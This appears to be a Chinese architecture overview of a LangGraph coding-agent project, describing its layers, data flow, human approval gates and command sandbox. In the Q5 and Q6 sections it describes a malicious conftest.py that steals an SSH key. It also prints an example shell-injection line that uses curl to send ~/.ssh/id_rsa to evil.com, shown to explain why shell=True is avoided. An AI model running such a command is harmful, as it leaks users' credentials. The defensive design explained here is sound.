# 架构总览

> 本文档是 Self-Agent 的顶层架构说明。读完你会清楚：整体怎么分层、数据怎么流转、各组件为什么这么选型。

---

## 一、设计目标

| 目标 | 说明 |
|---|---|
| **企业级质量** | 类型注解、结构化日志、统一异常、配置即代码、优雅降级 |
| **学习友好** | 每层职责单一、目录扁平清晰、文档与代码一一对应 |
| **面试可讲** | 每个技术选型都有"为什么"，能应对深度追问 |
| **可扩展** | 新增 LLM provider / 工具 / Agent 都不影响现有代码 |

---

## 二、分层架构

项目有**两个入口**共用同一套 Agent 内核：

```
   本地 CLI（selfagent）                    HTTP 服务（uvicorn app.main:app）
   进程内直接调用                            FastAPI + 认证 + 多租户 + 限流
            └────────────┬───────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                     入口层                                │
│  CLI: clients/cli/  ·  HTTP: app/api/  ·  Web: clients/web│
├─────────────────────────────────────────────────────────┤
│               业务服务层 (services/ · auth/)              │
│      会话管理 · 认证与角色 · 多租户隔离 · 用量统计         │
├─────────────────────────────────────────────────────────┤
│                   Agent 编排层 (LangGraph)                │
│        ┌──────────┐    条件路由    ┌───────┐             │
│        │ agent节点 │ ───────────→ │ tools │             │
│        │ (LLM思考) │ ←─────────── │ 节点  │             │
│        │ +流式writer│              │+审批闸门│            │
│        └──────────┘               └───────┘             │
│   + 任务计划 · 上下文压缩 · 流式中断 · 人在回路(interrupt) │
├─────────────────────────────────────────────────────────┤
│                   ★ 安全层                                │
│   工作区禁闭(workspace.py) · 命令沙箱(sandbox.py)          │
│   工具风险分级 · 审批策略 · 敏感文件保护                   │
├─────────────────────────────────────────────────────────┤
│   LLM 抽象层        │   记忆层          │   工具层        │
│  ┌───────────────┐  │ 短期(checkpoint) │ 文件/Shell 工具 │
│  │ GLM(OpenAI兼容)│  │ 长期(store)     │ 内置工具        │
│  │ OpenAI        │  │ 用户画像(Neo4j)  │ MCP / Skill 工具│
│  │ Anthropic     │  │  对话日志(Mongo) │ A2A delegate    │
│  └───────────────┘  │  RAG 知识库      │ 计划工具        │
├─────────────────────────────────────────────────────────┤
│                   数据访问层 (db/ · memory/)              │
│   SQLite（本地）  │  PostgreSQL  MongoDB  Redis  Neo4j    │
├─────────────────────────────────────────────────────────┤
│         基础设施 (infra/ Docker) + 可观测 (OpenTelemetry) │
└─────────────────────────────────────────────────────────┘
```

**★ 安全层（Phase 10）** 是编码 Agent 与聊天机器人的分界：
一旦 Agent 能读写文件、执行命令，就必须有一层专门回答
「它能碰什么」「碰之前要不要问人」「同意之后最多能造成多大破坏」。
它横切在 Agent 编排层与工具层之间——任何工具调用都绕不过去。

**存储的两种形态**：本地 CLI 用单文件 SQLite（零外部依赖），
服务端用 PostgreSQL 等四件套。切换只改 `STORAGE_BACKEND`，Agent 代码不变。

### 为什么这么分层？

每一层**只依赖它正下方的层**，符合"依赖倒置 + 单一职责"：

1. **API 层** 不关心 Agent 怎么实现，只负责接收请求、返回响应
2. **Agent 编排层** 不关心用哪个 LLM，只依赖 `LLMClient` 协议
3. **LLM 抽象层** 不关心 Agent 逻辑，只负责把统一请求转成各 provider 的格式
4. **数据访问层** 屏蔽具体数据库，提供连接管理

好处：**替换任何一层都不影响其他层**。比如把 GLM 换成 OpenAI，Agent 代码一行都不用改。

---

## 三、核心数据流：一次带工具调用的对话

以"北京今天天气怎么样？"为例，完整流转如下：

```
用户 POST /chat {message: "北京天气？", thread_id: "t1"}
  │
  ▼
[API 层] routes.py → run_agent()
  │
  ▼
[Agent 层] LangGraph 图执行
  │
  ├─① agent 节点：把消息 + 工具列表 → LLM 抽象层 → GLM
  │     GLM 返回：tool_calls=[get_weather(city="北京")]
  │
  ├─② 条件路由：检测到 tool_calls → 进入 tools 节点
  │
  ├─③ tools 节点：执行 get_weather("北京") → "晴 26°C..."
  │     结果作为 ToolMessage 追加到状态
  │
  ├─④ 回到 agent 节点：把工具结果再交给 GLM
  │     GLM 返回：自然语言总结 "北京今天晴，26度..."
  │
  └─⑤ 条件路由：无 tool_calls → 结束
  │
  ▼
[API 层] 返回 {reply: "北京今天晴，26度...", thread_id: "t1"}
```

**短期记忆**：整个过程中，checkpointer 在每步后保存状态快照。
下次用 `thread_id="t1"` 调用时，自动恢复历史消息，实现多轮对话。

### 3.1 带审批的编码任务（Phase 10 起）

工具涉及写文件或执行命令时，流程多一次「挂起—询问—恢复」：

```
用户 "读一下 main.py 然后加个注释"
  │
  ├─① agent 节点 → 大模型：调 read_file
  ├─② tools 节点：read_file 是 read 级 → 直接执行
  │     路径先过 Workspace.resolve() 禁闭检查
  │
  ├─③ agent 节点 → 大模型：调 edit_file
  ├─④ tools 节点：edit_file 是 write 级 → needs_approval() 判定要问
  │     │
  │     └─→ interrupt() 让**整张图挂起**，状态完整落盘
  │           事件流吐出 approval_required 后自然结束（不发 done）
  │
  │   ⏸  客户端展示确认框，用户按下 y
  │
  ├─⑤ resume_agent() → Command(resume={"approved": True})
  │     LangGraph 从 checkpointer 读回状态，
  │     从 interrupt() 那一行**原地继续**，返回用户决策
  │     工具在沙箱里真正执行
  │
  └─⑥ agent 节点 → 大模型总结 → 无 tool_calls → 结束
```

> ⚠️ 事件流**必须消费完**。拿到 `approval_required` 就 break 会让中断状态
> 来不及写进 checkpointer，之后 resume 什么也不做且不报错。
> `tests/test_local_mode.py` 有回归测试钉住这一行为。

**多步任务**还会在最前面多一步：大模型先调 `update_plan` 列出计划，
之后每完成一步就更新一次。计划存在 State 里随 checkpointer 持久化，
是长任务的外部记事板。

---

## 四、目录与职责对照

| 目录 | 职责 | 对应层 |
|---|---|---|
| `clients/cli/` | 命令行入口。本地模式内嵌 Agent，远程模式走 HTTP | 入口层 |
| `clients/web/` | React 前端 | 入口层 |
| `app/api/` | HTTP 路由、请求响应模型 | 入口层 |
| `app/services/` `app/auth/` | 会话、统计、认证、多租户 | 业务服务层 |
| `app/agent/` | LangGraph 状态图、节点、工具、计划、提示词 | Agent 编排层 |
| `app/workspace.py` | ★ 工作区与路径禁闭 | 安全层 |
| `app/sandbox.py` | ★ 命令沙箱（bwrap / Landlock） | 安全层 |
| `app/llm/` | 多协议 LLM 抽象与 provider 实现 | LLM 抽象层 |
| `app/memory/` | checkpointer、store、本地 SQLite、向量化 | 记忆层 |
| `app/rag/` | 知识库分块与检索 | 记忆层 |
| `app/mcp/` `app/a2a/` `app/skills/` | 协议与扩展 | 工具层 |
| `app/db/` | 4 个数据库的连接生命周期管理 | 数据访问层 |
| `app/core/` | 配置、日志、异常、链路追踪（横切关注点） | 跨层基础设施 |
| `infra/` | Docker 化的基础设施 + Jaeger | 基础设施 |

---

## 五、关键架构决策（面试常问）

### Q1: 为什么 LLM 用自研抽象层，而不是直接用 LangChain 的 ChatModel？

**答**：LangChain 的 `ChatOpenAI` / `ChatAnthropic` 耦合了它的消息类型和工具调用协议，且 `create_react_agent` 强制要求 LangChain 模型。自研抽象层让我们：
- **完全掌控**消息格式转换（OpenAI 和 Anthropic 的工具调用格式差异很大）
- **解耦** LangGraph 与具体 SDK，换 provider 零成本
- **统一**流式、token 统计、错误处理逻辑

代价是失去了 LangSmith 自动追踪 LLM 调用（但我们用结构化日志 + trace_id 补偿）。

### Q2: 为什么 GLM 走 OpenAI 兼容协议而不是官方 SDK？

**答**：智谱暴露了完全 OpenAI 兼容的 `/chat/completions` 端点，只需换 `base_url`。
- **零适配**：复用成熟的 openai SDK，工具调用、流式、token 统计全部白嫖
- **统一性**：GLM、OpenAI、DeepSeek、Moonshot 等都用同一份代码
- 官方 `zhipuai` SDK 只在需要 GLM 特有功能（如 thinking 模式）时才有必要

### Q3: 为什么用 PostgreSQL 而不是 MySQL？

**答**：LangGraph 的 checkpointer（短期记忆）和 store（长期记忆）官方**只实现**了 Postgres 和 SQLite 适配。
MySQL 需要自己实现整套 BaseCheckpointSaver 接口，工作量大、易踩坑。
Postgres 的 JSONB、pgvector、事务能力完全覆盖企业场景，是 Agent 领域事实标准。

### Q4: 数据库连不上时为什么不直接崩溃？

**答**：**优雅降级**。开发期常见某个容器没启动。
我们让连接失败只告警不阻断启动——这样 LLM 对话（不依赖 DB 也能跑，用 MemorySaver）仍可用。
这是生产系统韧性的体现：核心链路尽量独立于非关键依赖。

---

### Q5: 为什么审批和沙箱要分成两层？只做一层不行吗？

**答**：它们回答的是不同问题，互相替代不了。

- **审批**管「用户知不知情」——决策层。
- **沙箱**管「同意之后最多能造成多大破坏」——执行层。

只有审批不够，因为用户的"同意"是基于**它声称要做的事**：

> 你同意它跑 `pytest`。但项目里有个恶意 `conftest.py`，
> pytest 一启动就读走 `~/.ssh/id_rsa` 发到外网。
> 你点同意时想的是"跑个测试"。

只有沙箱也不够：沙箱不知道哪些操作用户愿意接受。删掉工作区里的源码
完全在沙箱允许范围内，但用户未必想要。

所以边界必须两层都有：**决策层问人，执行层限权**。

### Q6: 为什么不用 `shell=True` 执行命令？

**答**：`shell=True` 会让 `;`、`&&`、`|`、`$(...)`、反引号全部生效。
模型只要产出一个带分号的字符串就能绕开任何命令白名单：

```
"echo safe; curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)"
```

现在用 `shlex.split()` 拆词 + 列表参数形式执行，分号只是 echo 的普通参数。
代价是管道和重定向不能用，需要组合命令时分多次调用。
`tests/test_coding_tools.py` 里有专门的测试验证注入不生效。

---

## 六、架构演进历程

| Phase | 新增能力 | 架构影响 |
|---|---|---|
| P1 | 地基：LLM 层 + LangGraph + 短期记忆 | 确立五层分层 |
| P2 | MCP 协议 + Skill 系统 | tools 节点支持远程工具 |
| P3 | 长期记忆 + 用户画像 + 对话日志 | 新增记忆层与 Neo4j/Mongo |
| P4 | A2A 协议 | Agent 可被发现，也可调用外部 Agent |
| P5 | 测试套件 + 面试文档 | 工程化收尾 |
| P6 | 真·token 流式 + Hermes 自进化 + Web/CLI | 新增流式事件协议 |
| P7 | 会话管理 + 上下文压缩 + 流式中断 | 新增业务服务层 |
| P8 | 认证 + 多租户 + 限流 + RAG + 用量统计 | 服务层扩展 |
| P9 | OpenTelemetry 链路追踪 | 横切可观测 |
| **P10** | **工作区 + 文件/Shell 工具 + 审批闸门 + 命令沙箱** | **★ 新增安全层** |
| **P11** | **CLI 本地模式（内嵌 Agent + SQLite）+ 任务计划** | **★ 双入口 + State 扩展** |

P10 是分水岭：在此之前是"能聊天并调几个玩具工具"，
之后才具备编码 Agent 的实质能力，也因此必须补上安全层。
